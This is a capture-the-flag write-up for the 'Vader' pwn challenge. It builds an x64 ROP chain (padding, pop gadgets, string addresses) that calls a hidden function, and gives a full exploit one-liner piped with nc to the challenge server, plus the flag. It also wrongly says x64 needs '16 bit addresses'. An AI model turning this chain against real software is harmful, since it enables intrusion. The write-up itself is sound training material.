# Vader

We are given a binary where we need to print flag.txt

If we open the file with Ghidra we can see that the executable is in the function Vader() which takes four pointers as arguments and compares them to "DARK" => "S1D3"=> "OF" => "TH3" => "FORC3" We need to make a code that takes us to that function passing those arguments

The binary is x64 bit so we need 16 bit addresses.

We found the padding to be 40 characters.

Using readlf we can find Vader()

```
readelf -s vader
```

> 46: 000000000040146b   330 FUNC    GLOBAL DEFAULT   14 vader

We need to go to that address but we still need to pass the arguments, if we see the binary in ghidra we can find the addresses of the strings that contain the comparations, we can use them as the arguments

 - "DARK" => 0x00402ec9
 - "S1D3"=> 0x00402ece
 - "OF" => 0x00402ed3
 - "TH3" => 0x00402ed6
 - "FORC3"0x00402eda

We also need to find the gadgest that follow the correct format for x64 binaries:

The format is RDI, RSI, RDX, RCX, R8, R9

We can use ```ropr``` to see the address where each register is dropped

![image](https://github.com/MiguelCaputo/CTFs-writeups/blob/main/Space%20Heroes/regs.png)

pop_rdi = 0x0040165b
pop_rsi = 0x00401659; r15 (We just need to add p64(0) after the second argument)
pop_rcx = (0x004011cd) pop_rdx; pop_rcx (Because they are in this order we can use them but we need to flip the arguments)
pop_r8 = 0x004011d9
vader function = 0x40146b

Now we have all the info that we need, we can construct the payload like

padding + pop_rdi + 0x00402ec9("DARK") + pop_rsi + 0x00402ece("S1D3") + JUNK + pop_rcx + 0x00402ed6("TH3") + 0x00402ed3("OF") + pop_r8 + 0x00402eda("FORC3") + 0x40146b(vader)

## Final payload

```
python2 -c "from pwn import *; print 'A' * 40 + p64(0x0040165b) + p64(0x00402ec9) + p64(0x00401659) + p64(0x00402ece) + p64(0) + p64(0x004011cd) + p64(0x00402ed6) + p64(0x00402ed3) + p64(0x004011d9) + p64(0x00402eda) + p64(0x40146b)" | nc 0.cloud.chals.io 20712
```

## Flag
> shctf{th3r3-1s-n0-try}
